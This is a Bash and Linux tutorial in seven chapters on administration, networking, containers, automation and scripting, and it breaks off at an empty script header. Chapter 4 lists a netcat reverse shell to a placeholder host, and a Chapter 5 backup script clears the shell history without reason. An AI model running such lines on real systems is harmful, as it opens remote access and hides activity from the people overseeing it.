
# Bash and Linux Mastery

[Chapter 1: Introduction to Bash](#introduction-to-bash)

[Chapter 2: Advanced Bash and Linux Utilities](#chapter-2-advanced-bash-and-linux-utilities)

[Chapter 3: Mastering Advanced Concepts in Bash and Linux](#chapter-3-mastering-advanced-concepts-in-bash-and-linux)

[Chapter 4: Expert Techniques in Bash and Linux](#chapter-4-expert-techniques-in-bash-and-linux)

[Chapter 5: Mastery in Bash and Linux](#chapter-5-mastery-in-bash-and-linux)

[Chapter 6: Advanced Performance, Monitoring, and Scripting in Bash and Linux](#chapter-6-advanced-performance-monitoring-and-scripting-in-bash-and-linux)

[Chapter 7: Specialized Topics in Bash and Linux](#chapter-7-specialized-topics-in-bash-and-linux)


# Introduction to Bash
Bash (Bourne Again Shell) is a command-line interpreter that allows users to interact directly with the Linux operating system. It is widely used for scripting and automating tasks.

**Basic Command Structure:**
```bash
<command> [options] [arguments]
```

**File and Directory Management:**
- **List files**: `ls -la`
- **Change directory**: `cd /path/to/directory`
- **Make new directory**: `mkdir new_directory`
- **Copy files**: `cp source_file destination_file`
- **Move/Rename files**: `mv old_name new_name`
- **Delete files**: `rm file_name`
- **View file contents**: `cat file_name`, `less file_name`

**System Information:**
- **Check disk usage**: `df -h`
- **Check memory usage**: `free -m`
- **Show system information**: `uname -a`
- **Check running processes**: `ps aux`
- **View system logs**: `tail -f /var/log/syslog`

**User and Permissions Management:**
- **Add user**: `sudo adduser username`
- **Change user password**: `passwd username`
- **Change file ownership**: `chown user:group file`
- **Change file permissions**: `chmod 755 file`

**Networking Tools:**
- **Check network configuration**: `ifconfig` or `ip a`
- **Display routing table**: `route -n` or `ip route`
- **Test network connectivity**: `ping address`
- **Transfer files with SCP**: `scp source_file user@remote_host:/path/to/destination`

**Package Management (Debian-based):**
- **Update package list**: `sudo apt update`
- **Upgrade all installed packages**: `sudo apt upgrade`
- **Install a new package**: `sudo apt install package_name`
- **Remove a package**: `sudo apt remove package_name`

**Scripting and Automation:**
- **Create a script**: Use a text editor like `nano`, `vim`, or `gedit`
- **Start a script with the shebang**: `#!/bin/bash`
- **Make a script executable**: `chmod +x script.sh`
- **Run a script**: `./script.sh`

**Example Script:**
```bash
#!/bin/bash
echo "Starting backup..."
tar -czvf backup.tar.gz /path/to/directory
echo "Backup completed!"
```

**Advanced Tips:**
- **Chain commands**: Use `;`, `&&`, or `||` to chain commands (e.g., `command1 && command2`).
- **Use wildcards**: `*` matches any number of characters; `?` matches a single character.
- **Redirection**: Send the output of a command to a file (`>` for overwrite, `>>` for append).
- **Pipes**: Use `|` to pass the output of one command to another (e.g., `ls -la | grep 'pattern'`).
- **Background processes**: Run processes in the background using `&` (e.g., `command &`).

**Best Practices:**
- **Regularly update system packages**.
- **Use version control (e.g., Git) for script management**.
- **Understand the impact of each command, especially when running commands with `sudo`**.
- **Backup important data regularly**.
- **Practice security by setting appropriate permissions and using firewalls**.

**Troubleshooting:**
- **Check error messages** for clues.
- **Use man pages** to understand command options (e.g., `man ls`).
- **Consult online resources** like forums, documentation, and Stack Overflow.

# Chapter 2: Advanced Bash and Linux Utilities

---

**1. Advanced File and Directory Manipulation:**
- **Symbolic links**: Create shortcuts or aliases to files and directories.
  ```bash
  ln -s target_file link_name
  ```

- **Find files**: Locate files based on various criteria.
  ```bash
  find /path/to/search -name "pattern" -type f
  ```

- **Change timestamps**: Update file access and modification times.
  ```bash
  touch -t [[CC]YY]MMDDhhmm[.ss] file_name
  ```

**2. File Compression and Archiving:**
- **Compress files with gzip**:
  ```bash
  gzip file_name
  ```
  
- **Decompress files**:
  ```bash
  gunzip file_name.gz
  ```

- **Create a tarball**:
  ```bash
  tar -czvf archive_name.tar.gz /path/to/directory
  ```

- **Extract a tarball**:
  ```bash
  tar -xzvf archive_name.tar.gz
  ```

**3. Text Processing Tools:**
- **Grep**: Search for patterns within files.
  ```bash
  grep -r "pattern" /path/to/search
  ```

- **Sed**: Stream editor for parsing and transforming text.
  ```bash
  sed 's/old_pattern/new_pattern/g' input_file
  ```

- **Awk**: A powerful text processing language.
  ```bash
  awk '{print $1, $3}' input_file
  ```

- **Cut**: Extract sections from each line of files.
  ```bash
  cut -d',' -f1,3 input_file
  ```

- **Sort**: Sort lines of text files.
  ```bash
  sort input_file
  ```

- **Uniq**: Report or filter out repeated lines.
  ```bash
  sort input_file | uniq
  ```

- **Tr**: Translate or delete characters.
  ```bash
  tr 'a-z' 'A-Z' < input_file
  ```

**4. Process Management:**
- **Kill processes**: Send signals to processes.
  ```bash
  kill -9 process_id
  ```

- **Monitor processes**: Use `top` or `htop` for real-time monitoring.
  ```bash
  top
  htop
  ```

- **Background and foreground processes**:
  ```bash
  command &   # Run command in background
  fg          # Bring it to foreground
  bg          # Send it to background again
  ```

- **Job control**:
  ```bash
  jobs        # List jobs
  kill %job_id  # Kill a job by its ID
  ```

**5. Networking and Security:**
- **Netstat**: Network statistics.
  ```bash
  netstat -tuln
  ```

- **Nslookup**: Query internet name servers.
  ```bash
  nslookup domain_name
  ```

- **Nmap**: Network scanning.
  ```bash
  nmap -sP 192.168.1.0/24
  ```

- **SSH**: Secure shell for remote login.
  ```bash
  ssh user@remote_host
  ```

- **Configure firewall with UFW**:
  ```bash
  sudo ufw allow port_number
  sudo ufw enable
  sudo ufw status
  ```

**6. System Performance and Monitoring:**
- **Iostat**: Report CPU and I/O statistics.
  ```bash
  iostat
  ```

- **Vmstat**: Report virtual memory statistics.
  ```bash
  vmstat
  ```

- **Perf**: Performance analysis.
  ```bash
  perf stat -p process_id
  ```

**7. Version Control with Git:**
- **Initialize a repository**:
  ```bash
  git init
  ```

- **Clone a repository**:
  ```bash
  git clone repository_url
  ```

- **Commit changes**:
  ```bash
  git add .
  git commit -m "Commit message"
  ```

- **Push changes**:
  ```bash
  git push origin branch_name
  ```

- **Pull changes**:
  ```bash
  git pull origin branch_name
  ```

**8. Customizing Bash Environment:**
- **.bashrc and .bash_profile**: Configure environment variables and aliases.
  ```bash
  nano ~/.bashrc
  # Example: alias ll='ls -la'
  ```

- **Environment Variables**:
  ```bash
  export PATH=$PATH:/new/path
  ```

- **Prompt customization**:
  ```bash
  PS1="[\u@\h \W]\$ "
  ```

**9. Task Scheduling with Cron:**
- **Edit crontab**:
  ```bash
  crontab -e
  ```

- **Crontab format**:
  ```text
  * * * * * command_to_execute
  # Example: 0 5 * * * /path/to/backup.sh (runs daily at 5am)
  ```

**10. Advanced Scripting Techniques:**
- **Loops**:
  ```bash
  for i in {1..10}; do echo $i; done
  ```

- **Conditionals**:
  ```bash
  if [ condition ]; then
    command
  elif [ condition ]; then
    command
  else
    command
  fi
  ```

- **Functions**:
  ```bash
  my_function() {
    echo "Hello, $1!"
  }
  my_function "Bash"
  ```

**11. Example Advanced Script:**
```bash
#!/bin/bash

# Backup script

TARGET_DIR="/path/to/backup"
BACKUP_FILE="backup_$(date +%F).tar.gz"
LOG_FILE="/var/log/backup.log"

# Create backup
tar -czvf $TARGET_DIR/$BACKUP_FILE /important/data 2>> $LOG_FILE

# Check success
if [ $? -eq 0 ]; then
  echo "$(date +%F_%T) Backup successful" >> $LOG_FILE
else
  echo "$(date +%F_%T) Backup failed" >> $LOG_FILE
fi
```

**12. Debugging Scripts:**
- **Print debug information**:
  ```bash
  set -x
  # Commands to debug
  set +x
  ```

- **Inspect variables**:
  ```bash
  echo "Variable value: $variable"
  ```

- **Check exit status**:
  ```bash
  echo "Last command exit status: $?"
  ```

---



# Chapter 3: Mastering Advanced Concepts in Bash and Linux

---

**1. Advanced Shell Scripting Techniques:**
- **Arrays in Bash:**
  ```bash
  my_array=(value1 value2 value3)
  echo ${my_array[0]}  # Access first element
  echo ${my_array[@]}  # Access all elements
  ```

- **Here Documents:**
  ```bash
  cat <<EOF
  This is a here document.
  It allows multi-line strings.
  EOF
  ```

- **Subshells:**
  ```bash
  (cd /tmp && ls)  # Run commands in a subshell
  ```

- **Command Substitution:**
  ```bash
  current_date=$(date)
  echo "Today's date is $current_date"
  ```

**2. Regular Expressions with Bash:**
- **Basic regex match:**
  ```bash
  if [[ "text" =~ ^t.*t$ ]]; then
    echo "Matches regex"
  fi
  ```

- **Using `grep` with regex:**
  ```bash
  grep -E 'pattern' file
  ```

**3. Advanced Text Processing with `sed` and `awk`:**
- **Advanced `sed` examples:**
  ```bash
  sed -i 's/foo/bar/g' file  # Inline edit
  sed -n '2,4p' file         # Print lines 2 to 4
  ```

- **Advanced `awk` examples:**
  ```bash
  awk '{ if ($3 > 50) print $1, $2; }' file     # Conditional filtering
  awk -F, '{sum += $2} END {print sum}' file.csv # Summing column values
  ```

**4. Data Management and Databases:**
- **MySQL Basics:**
  ```bash
  sudo service mysql start                        # Start MySQL
  mysql -u username -p                            # Connect to MySQL
  mysql> CREATE DATABASE database_name;           # Create a database
  mysql> USE database_name;                       # Select a database
  mysql> CREATE TABLE table_name (id INT, name VARCHAR(50)); # Create a table
  mysql> INSERT INTO table_name VALUES (1, 'Name');  # Insert data
  mysql> SELECT * FROM table_name;                # Query data
  ```

- **SQLite Basics:**
  ```bash
  sqlite3 database.db                             # Access SQLite database
  sqlite> CREATE TABLE table_name (id INT, name TEXT); # Create table
  sqlite> INSERT INTO table_name VALUES (1, 'Name');  # Insert data
  sqlite> SELECT * FROM table_name;               # Query data
  ```

**5. System Monitoring and Performance Tuning:**
- **Analyzing disk I/O with `iostat`:**
  ```bash
  iostat -x 1 10  # Extended stats every second for 10 intervals
  ```

- **Analyzing and tuning system performance with `sysctl`:**
  ```bash
  sudo sysctl -w net.ipv4.tcp_fin_timeout=30
  sudo sysctl -p  # Reload sysctl settings
  ```

- **Monitoring system resource usage with `vmstat`:**
  ```bash
  vmstat 1 5  # Report virtual memory statistics every second for 5 intervals
  ```

- **Analyzing memory with `free`:**
  ```bash
  free -h  # Display memory usage in human-readable format
  ```

**6. Network Troubleshooting and Configuration:**
- **Netcat (nc) utilities:**
  ```bash
  nc -zv 192.168.1.1 80       # Check if port 80 is open on remote host
  nc -l 1234 > file_name     # Set up a listener on port 1234 and redirect input to a file
  ```

- **IPTables for network traffic control:**
  ```bash
  sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT  # Allow SSH
  sudo iptables -A INPUT -j DROP                      # Drop all other input
  sudo iptables -L                                     # List rules
  ```

- **Setting up a VPN with OpenVPN:**
  ```bash
  sudo apt install openvpn
  sudo openvpn --config /path/to/config.ovpn
  ```

**7. Automation and Job Scheduling Beyond Cron:**
- **Using `at` for one-time tasks:**
  ```bash
  echo "sh /path/to/script.sh" | at now + 5 minutes
  ```

- **Job control with `systemd` timers:**
  ```bash
  sudo systemctl start mytimer.timer
  sudo systemctl enable mytimer.timer
  ```

**8. Containerization with Docker:**
- **Basic Docker commands:**
  ```bash
  sudo docker run hello-world                    # Run a Docker container
  sudo docker ps                                 # List running containers
  sudo docker images                             # List Docker images
  sudo docker build -t my_image .                # Build Docker image from Dockerfile
  sudo docker run -d -p 80:80 my_image           # Run container in detached mode
  ```

- **Docker Compose for multi-container applications:**
  ```yaml
  version: '3'
  services:
    web:
      image: nginx
      ports:
        - "80:80"
    db:
      image: mysql
      environment:
        MYSQL_ROOT_PASSWORD: example
  ```

  ```bash
  sudo docker-compose up                         # Start multi-container application
  ```

**9. Virtualization with KVM/QEMU:**
- **Install and configure KVM:**
  ```bash
  sudo apt install qemu-kvm libvirt-daemon-system
  sudo adduser `id -un` libvirt
  ```

- **Manage VMs with `virsh`:**
  ```bash
  virsh list --all                               # List all virtual machines
  virsh start vm_name                            # Start a VM
  virsh shutdown vm_name                         # Shutdown a VM
  ```

**10. Security Best Practices:**
- **User and group management:**
  ```bash
  sudo adduser newuser
  sudo usermod -aG sudo newuser
  ```

- **Using `fail2ban` for intrusion prevention:**
  ```bash
  sudo apt install fail2ban
  sudo systemctl enable fail2ban
  sudo systemctl start fail2ban
  sudo fail2ban-client status
  ```

- **Enhanced security with SELinux/AppArmor:**
  ```bash
  sudo apt install apparmor
  sudo aa-status  # Check AppArmor status
  ```

**11. Backup and Recovery:**
- **Using `rsync` for efficient file transfer and synchronization:**
  ```bash
  rsync -avz /source/directory /destination/directory
  ```

- **Disk imaging with `dd`:**
  ```bash
  sudo dd if=/dev/sdX of=/path/to/image.img bs=4M status=progress
  ```

- **Snapshot management with `btrfs` or `LVM`:**
  ```bash
  sudo btrfs subvolume snapshot /mnt/@ /mnt/@_snapshot
  ```

**12. Example Comprehensive Script for System Health Check:**
```bash
#!/bin/bash

LOGFILE="/var/log/system_health.log"

# Function to log system information
log_info() {
  echo "$(date +'%Y-%m-%d %H:%M:%S') - $1" >> $LOGFILE
}

# Disk usage
log_info "Disk Usage:"
df -h | grep '^/dev/' >> $LOGFILE

# Memory usage
log_info "Memory Usage:"
free -h >> $LOGFILE

# CPU Load
log_info "CPU Load:"
uptime >> $LOGFILE

# Check running services
log_info "Running Services:"
systemctl list-units --type=service --state=running >> $LOGFILE

# Network connections
log_info "Network Connections:"
netstat -tuln >> $LOGFILE

# End script
log_info "System Health Check Completed."
```

---


# Chapter 4: Expert Techniques in Bash and Linux

---

**1. Advanced Shell Scripting Techniques:**
- **Command-Line Arguments:**
  ```bash
  #!/bin/bash
  echo "Script name: $0"
  echo "First argument: $1"
  echo "All arguments: $@"
  ```

- **Handling Command-Line Options with `getopts`:**
  ```bash
  while getopts ":a:b:c:" opt; do
    case $opt in
      a) echo "Option a, argument $OPTARG";;
      b) echo "Option b, argument $OPTARG";;
      c) echo "Option c, argument $OPTARG";;
      \?) echo "Invalid option $OPTARG";;
    esac
  done
  ```

- **Error Handling and Debugging:**
  ```bash
  set -e  # Exit on error
  set -u  # Treat unset variables as errors
  set -o pipefail  # Return exit status of the last command in the pipeline to fail
  
  trap 'echo "Error on line $LINENO"; exit 1' ERR
  ```

**2. Advanced File and Data Manipulation:**
- **Finding and Replacing Text in Multiple Files:**
  ```bash
  find . -type f -name "*.txt" -exec sed -i 's/old_text/new_text/g' {} +
  ```

- **Counting Words, Lines, and Characters:**
  ```bash
  wc -l file.txt   # Count lines
  wc -w file.txt   # Count words
  wc -c file.txt   # Count characters
  ```

- **Splitting Large Files:**
  ```bash
  split -b 100M largefile.txt part_
  ```

**3. Advanced Networking Operations:**
- **Advanced `nc` Operations:**
  ```bash
  # Create a simple chat server
  while true; do nc -l -p 1234 -e /bin/cat; done
  
  # Create a reverse shell (use with caution)
  nc -e /bin/bash target_host 4444
  ```

- **Traffic Analysis with `tcpdump`:**
  ```bash
  sudo tcpdump -i eth0 -w capture.pcap
  sudo tcpdump -r capture.pcap
  ```

- **Network Performance Testing with `iperf`:**
  ```bash
  # On server-side
  iperf3 -s

  # On client-side
  iperf3 -c server_ip
  ```

**4. Advanced Package Management (RPM-Based Systems):**
- **Installing and Removing Packages:**
  ```bash
  sudo yum install package_name
  sudo yum remove package_name
  ```

- **Managing Repositories:**
  ```bash
  sudo yum-config-manager --add-repo http://example.com/repository.repo
  sudo yum repolist
  ```

- **Querying RPM Packages:**
  ```bash
  rpm -qa | grep package_name
  rpm -ql package_name
  ```

**5. Advanced System Monitoring and Logging:**
- **Using `sar` for Historical System Performance Analysis:**
  ```bash
  # Install sysstat package
  sudo apt-get install sysstat
  
  # Collect data
  sudo sar -u 1 5  # CPU usage
  sudo sar -r 1 5  # Memory usage
  ```

- **Analyzing Logs with `journalctl`:**
  ```bash
  sudo journalctl -u servicename  # View logs for a specific service
  sudo journalctl -b              # Logs since last boot
  ```

- **Setting Up `logrotate` for Log Management:**
  ```bash
  sudo nano /etc/logrotate.d/custom_log
  
  # Example logrotate configuration
  /var/log/custom_log {
      daily
      rotate 7
      compress
      missingok
      notifempty
  }
  ```

**6. Advanced Process Management:**
- **Understanding cgroups for Resource Allocation:**
  ```bash
  # Install cgroup tools
  sudo apt-get install cgroup-tools
    
  # Create a new cgroup and limit memory
  sudo cgcreate -g memory:mygroup
  sudo cgset -r memory.limit_in_bytes=100M mygroup
  cgexec -g memory:mygroup /path/to/your/application
  ```

- **Process Prioritization with `nice` and `renice`:**
  ```bash
  # Start a process with specific priority
  nice -n 10 command

  # Change the priority of an existing process
  renice -n 5 -p process_id
  ```

**7. System Automation with Ansible:**
- **Installation and Configuration:**
  ```bash
  sudo apt-get install ansible
  
  # Hosts file configuration
  sudo nano /etc/ansible/hosts
  [servers]
  server1 ansible_host=192.168.1.10
  server2 ansible_host=192.168.1.11
  ```

- **Running Playbooks:**
  ```yaml
  # Example Playbook
  ---
  - name: Install and configure Apache
    hosts: servers
    become: yes
    tasks:
      - name: Install Apache
        apt:
          name: apache2
          state: present
    
      - name: Start Apache service
        service:
          name: apache2
          state: started
          enabled: true
  ```

  ```bash
  ansible-playbook -i /etc/ansible/hosts playbook.yml
  ```

**8. Containerization with Kubernetes:**
- **Basic Kubernetes Commands:**
  ```bash
  kubectl get nodes               # List all nodes
  kubectl get pods                # List all pods
  kubectl describe pod pod_name   # Describe a specific pod
  kubectl apply -f deployment.yaml # Apply a deployment configuration
  ```

- **Example Kubernetes Deployment:**
  ```yaml
  apiVersion: apps/v1
  kind: Deployment
  metadata:
    name: nginx-deployment
    labels:
      app: nginx
  spec:
    replicas: 3
    selector:
      matchLabels:
        app: nginx
    template:
      metadata:
        labels:
          app: nginx
      spec:
        containers:
        - name: nginx
          image: nginx:latest
          ports:
          - containerPort: 80
  ```

  ```bash
  kubectl apply -f deployment.yaml
  ```

**9. Advanced Backup Strategies:**
- **Incremental Backups with `rsnapshot`:**
  ```bash
  sudo apt-get install rsnapshot
  
  # Configuration file
  sudo nano /etc/rsnapshot.conf
  
  # Example configuration
  snapshot_root   /backup/
  interval        hourly  6
  interval        daily   7
  interval        weekly  4
  interval        monthly 3
  backup  /home/  localhost/
  
  # Running rsnapshot
  sudo rsnapshot hourly
  ```

- **Database Backups with `mysqldump`:**
  ```bash
  mysqldump -u username -p database_name > backup.sql
  
  # Scheduled via cron
  0 2 * * * /usr/bin/mysqldump -u username -p password database_name > /backups/backup-$(date +\%F).sql
  ```

**10. Example Comprehensive Script with Advanced Techniques:**
```bash
#!/bin/bash

# Backup script with logging and error handling

LOGFILE="/var/log/backup.log"
SOURCE_DIR="/path/to/source"
BACKUP_DIR="/path/to/backup"
ARCHIVE_NAME="backup_$(date +'%Y-%m-%d').tar.gz"

# Function to log messages
log_msg() {
  echo "$(date +'%Y-%m-%d %H:%M:%S') - $1" >> $LOGFILE
}

# Function to perform backup
perform_backup() {
  tar -czvf $BACKUP_DIR/$ARCHIVE_NAME $SOURCE_DIR
  if [ $? -eq 0 ]; then
    log_msg "Backup successful: $ARCHIVE_NAME"
  else
    log_msg "Backup failed: $ARCHIVE_NAME"
  fi
}

# Main script execution
log_msg "Starting backup process"
perform_backup
log_msg "Backup process completed"
```

---


# Chapter 5: Mastery in Bash and Linux

---

### 1. Advanced File Systems and Storage Management:

- **LVM (Logical Volume Management):**
  - **Create a Physical Volume (PV):**
    ```bash
    sudo pvcreate /dev/sdX
    ```
  - **Create a Volume Group (VG):**
    ```bash
    sudo vgcreate vg_name /dev/sdX
    ```
  - **Create a Logical Volume (LV):**
    ```bash
    sudo lvcreate -L 10G -n lv_name vg_name
    ```
  - **Format and Mount the LV:**
    ```bash
    sudo mkfs.ext4 /dev/vg_name/lv_name
    sudo mount /dev/vg_name/lv_name /mnt
    ```

- **Btrfs (B-tree File System):**
  - **Create and Mount a Btrfs File System:**
    ```bash
    sudo mkfs.btrfs /dev/sdX
    sudo mount /dev/sdX /mnt
    ```
  - **Create Subvolumes:**
    ```bash
    sudo btrfs subvolume create /mnt/subvolume_name
    ```
  - **Take Snapshots:**
    ```bash
    sudo btrfs subvolume snapshot /mnt/@ /mnt/@_snapshot
    ```

### 2. Kernel Tuning and Optimization:
- **Sysctl - Kernel Parameters Configuration:**
  - **Modify Runtime Parameters:**
    ```bash
    sudo sysctl -w net.ipv4.tcp_fin_timeout=30
    sudo sysctl -w vm.swappiness=10
    ```
  - **Persistently Save Kernel Parameters:**
    ```bash
    sudo nano /etc/sysctl.conf
    # Add parameters here
    net.ipv4.tcp_fin_timeout=30
    vm.swappiness=10
    ```
  - **Reload Sysctl Settings:**
    ```bash
    sudo sysctl -p
    ```

- **Grub Configuration:**
  - **Modify Grub Configuration:**
    ```bash
    sudo nano /etc/default/grub
    ```
  - **Update Grub:**
    ```bash
    sudo update-grub
    ```

- **Kernel Module Management:**
  - **List Loaded Modules:**
    ```bash
    lsmod
    ```
  - **Load a New Module:**
    ```bash
    sudo modprobe module_name
    ```
  - **Remove a Module:**
    ```bash
    sudo modprobe -r module_name
    ```

### 3. Container Orchestration with Kubernetes:
- **Advanced Kubernetes Commands:**
  - **Scale a Deployment:**
    ```bash
    kubectl scale --replicas=5 deployment/nginx-deployment
    ```
  - **Rolling Update of Deployments:**
    ```bash
    kubectl set image deployment/nginx-deployment nginx=nginx:latest --record
    ```

- **Helm - Kubernetes Package Manager:**
  - **Install Helm:**
    ```bash
    curl https://raw.githubusercontent.com/helm/helm/master/scripts/get-helm-3 | bash
    ```
  - **Add a Helm Repository:**
    ```bash
    helm repo add stable https://charts.helm.sh/stable
    ```
  - **Install a Chart:**
    ```bash
    helm install my-release stable/nginx
    ```

- **Monitoring with Prometheus and Grafana:**
  - **Install Prometheus:**
    ```bash
    kubectl apply -f https://raw.githubusercontent.com/prometheus-operator/prometheus-operator/master/bundle.yaml
    ```
  - **Install Grafana:**
    ```bash
    helm install grafana stable/grafana
    ```

### 4. Advanced Security Practices:
- **SELinux (Security-Enhanced Linux):**
  - **Check SELinux Status:**
    ```bash
    sudo sestatus
    ```
  - **Enable/Disable SELinux:**
    ```bash
    sudo setenforce 1  # Enforcing mode
    sudo setenforce 0  # Permissive mode
    ```
  - **Modify SELinux Config File:**
    ```bash
    sudo nano /etc/selinux/config
    ```

- **AppArmor (Application Armor):**
  - **Install AppArmor:**
    ```bash
    sudo apt-get install apparmor-utils
    ```
  - **Check AppArmor Status:**
    ```bash
    sudo aa-status
    ```
  - **Set AppArmor Profiles:**
    ```bash
    sudo aa-enforce /etc/apparmor.d/usr.bin.yourapp
    ```
- **Advanced Firewall Rules with `iptables`:**
  - **Restrict SSH Access:**
    ```bash
    sudo iptables -A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT
    sudo iptables -A INPUT -p tcp --dport 22 -j DROP
    ```

- **Securing Data in Transit with VPNs:**
  - **OpenVPN Setup:**
    ```bash
    sudo apt-get install openvpn
    sudo openvpn --config /path/to/your-vpn-config.ovpn
    ```

### 5. Advanced Automation with Ansible:
- **Managing Roles and Playbooks:**
  - **Create a Role:**
    ```bash
    ansible-galaxy init myrole
    ```
  - **Using Roles in Playbooks:**
    ```yaml
    - name: Apply roles
      hosts: all
      roles:
         - myrole
    ```

- **Advanced Inventory Management:**
  - **Dynamic Inventory:**
    ```bash
    # Sample inventory script
    #!/usr/bin/env python3
    import json
    inventory = {
        "servers": {
            "hosts": ["server1", "server2"]
        }
    }
    print(json.dumps(inventory))
    ```

- **Ansible Vault for Secrets Management:**
  - **Encrypt Sensitive Data:**
    ```bash
    ansible-vault encrypt secret.yml
    ```
  - **Decrypt Sensitive Data:**
    ```bash
    ansible-vault decrypt secret.yml
    ```

### 6. Automation and CI/CD with Jenkins:
- **Jenkins Setup:**
  - **Install Jenkins:**
    ```bash
    sudo apt-get install jenkins
    ```
  - **Start Jenkins:**
    ```bash
    sudo systemctl start jenkins
    ```

- **Setting Up Pipelines:**
  - **Create a Jenkinsfile:**
    ```groovy
    pipeline {
        agent any
    
        stages {
            stage('Build') {
                steps {
                    sh 'make'
                }
            }
            stage('Test') {
                steps {
                    sh 'make test'
                }
            }
            stage('Deploy') {
                steps {
                    sh 'make deploy'
                }
            }
        }
    }
    ```
  - **Add Credentials in Jenkins:**
    - Navigate to Jenkins -> Manage Jenkins -> Manage Credentials -> Global -> Add Credentials

- **Automating Docker Builds:**
  - **Create a Dockerfile:**
    ```Dockerfile
    FROM python:3.8-slim-buster

    WORKDIR /app

    COPY requirements.txt requirements.txt
    RUN pip3 install -r requirements.txt

    COPY . .

    CMD ["python3", "app.py"]
    ```
  - **Build and Push Docker Image with Jenkins:**
    ```groovy
    pipeline {
        agent any

        environment {
            registry = "your_registry"
            registryCredential = 'dockerhub'
            dockerImage = ''
        }

        stages {
            stage('Cloning Git') {
                steps {
                    git 'https://github.com/your-repository.git'
                }
            }
            stage('Building image') {
                steps {
                    script {
                        dockerImage = docker.build registry + ":$BUILD_NUMBER"
                    }
                }
            }
            stage('Deploy Image') {
                steps{
                    script {
                        docker.withRegistry( '', registryCredential ) {
                            dockerImage.push()
                        }
                    }
                }
            }
        }
    }
    ```

### 7. Example Advanced Script for Multi-Step Task Automation:
Here’s a comprehensive script that combines several advanced techniques:

```bash
#!/bin/bash
# Script to automate backup, transfer to another server and clean up old backups

set -e
trap 'echo "Error occurred at line $LINENO"; exit 1' ERR

SOURCE_DIR="/home/user/data"
BACKUP_DIR="/home/user/backup"
REMOTE_SERVER="user@remote_host"
REMOTE_DIR="/remote/backup"
RETENTION_DAYS=7

# Create a backup
echo "Creating backup..."
BACKUP_FILE="${BACKUP_DIR}/backup_$(date +'%Y%m%d_%H%M%S').tar.gz"
tar -czvf $BACKUP_FILE $SOURCE_DIR

# Transfer backup to remote server
echo "Transferring backup to remote server..."
scp $BACKUP_FILE $REMOTE_SERVER:$REMOTE_DIR

# Clean up local backups older than retention period
echo "Cleaning up old backups..."
find $BACKUP_DIR -type f -name "*.tar.gz" -mtime +$RETENTION_DAYS -exec rm {} \;

# Clear bash history for this session
history -c

echo "Backup and transfer complete."
```

### 8. Bonus Section: Customizing Your Bash Environment with Advanced Techniques:
- **Advanced Aliases and Functions:**
  ```bash
  # Aliases
  alias gs='git status'
  alias gl='git log'
  alias ll='ls -FAlh'

  # Functions
  function mkcd() {
    mkdir -p "$1" && cd "$1"
  }

  function extract() {
    if [ -f $1 ] ; then
      case $1 in
        *.tar.bz2)   tar xjf $1   ;;
        *.tar.gz)    tar xzf $1   ;;
        *.bz2)       bunzip2 $1   ;;
        *.rar)       unrar e $1   ;;
        *.gz)        gunzip $1    ;;
        *.tar)       tar xvf $1   ;;
        *.tbz2)      tar xjf $1   ;;
        *.tgz)       tar xzf $1   ;;
        *.zip)       unzip $1     ;;
        *.Z)         uncompress $1;;
        *.7z)        7z x $1      ;;
        *)           echo "'$1' cannot be extracted via extract()" ;;
      esac
    else
      echo "'$1' is not a valid file"
    fi
  }
  ```

- **Enhancing the Prompt (PS1):**
  ```bash
  PS1='\[\e[32m\]\u@\h:\[\e[33m\]\w\[\e[0m\]\$ '
  ```

- **Using `.inputrc` for Command Line Tweaks:**
  ```bash
  # Case-insensitive tab completion
  set completion-ignore-case On
  # Show all matches in horizontal view
  set show-all-if-ambiguous On
  # Append `/` to directories and `space` to files
  TAB: menu-complete
  ```

---


# Chapter 6: Advanced Performance, Monitoring, and Scripting in Bash and Linux

---

### 1. Performance Optimization Techniques:

- **CPU and Memory Optimization:**
  - **CPU Affinity:**
    ```bash
    taskset -c 0,1 my_command  # Bind a process to specific CPUs
    ```
  - **Monitoring CPU Performance with `mpstat`:**
    ```bash
    mpstat -P ALL 1 5  # Display CPU usage per processor
    ```
  - **Memory Optimization:**
    ```bash
    sudo sysctl -w vm.dirty_ratio=10  # Adjust dirty ratio for writeback caching
    sudo sysctl -w vm.swappiness=10  # Adjust kernel swap behavior
    ```

- **I/O Performance Tuning:**
  - **Tuning Disk I/O with `hdparm`:**
    ```bash
    sudo hdparm -Tt /dev/sdX  # Test read performance
    sudo hdparm -S 240 /dev/sdX  # Set the standby timeout to 240*5 seconds
    ```
  - **I/O Scheduler Tuning:**
    ```bash
    echo noop | sudo tee /sys/block/sdX/queue/scheduler  # Set 'noop' I/O scheduler
    ```

### 2. Advanced User and Group Management:

- **Managing User Privileges:**
  - **Creating and Managing Groups:**
    ```bash
    sudo groupadd developers
    sudo usermod -aG developers username
    ```
  - **Configuring `sudoers` for Fine-Grained Access Control:**
    ```bash
    sudo visudo
    
    # Example entry
    username ALL=(ALL) NOPASSWD: /usr/bin/systemctl
    ```
  - **Per-User and Per-Group Resource Limits with `limits.conf`:**
    ```bash
    sudo nano /etc/security/limits.conf
    
    # Example limits
    username  hard  nofile  1024
    @developers soft memlock 1024000
    ```

### 3. Comprehensive System Monitoring:

- **Detailed System Information with `dstat`:**
    ```bash
    dstat -cdngy --tcp 5  # Display CPU, disk, net, and I/O statistics every 5 seconds
    ```
- **Real-Time Monitoring with `glances`:**
    ```bash
    sudo apt-get install glances
    glances  # Launch glances for real-time monitoring
    ```

- **Graphing Metrics with Collectd and Grafana:**
  - **Install Collectd:**
    ```bash
    sudo apt-get install collectd
    sudo systemctl start collectd
    ```
  - **Configure Collectd:**
    ```bash
    sudo nano /etc/collectd/collectd.conf
    
    # Example configuration to collect CPU and Memory metrics
    LoadPlugin cpu
    LoadPlugin memory
    ```
  - **Install Grafana:**
    ```bash
    sudo apt-get install grafana
    sudo systemctl start grafana-server
    ```
  - **Add Collectd Data Source in Grafana:**
    - Navigate to Grafana -> Configuration -> Data Sources -> Add Data Source
    - Choose "Graphite" and configure it to read from Collectd's output

### 4. Mastering Advanced Scripting:

- **Using Advanced Bash Features:**
  - **Complex Conditional Expressions:**
    ```bash
    if [[ $var -gt 10 && $var -lt 20 ]]; then
      echo "Variable is between 10 and 20"
    fi
    ```

  - **Advanced Loop Constructs:**
    ```bash
    # While read loop with file descriptor
    while IFS= read -r line; do
      echo "Processing $line"
    done < input_file.txt
    ```

  - **Parallel Processing with `xargs`:**
    ```bash
    cat urls.txt | xargs -n 1 -P 4 wget
    ```

- **Scripting for Real-World Applications:**
  - **Automated Deployment Script Example:**
    ```bash
    #!/bin/bash
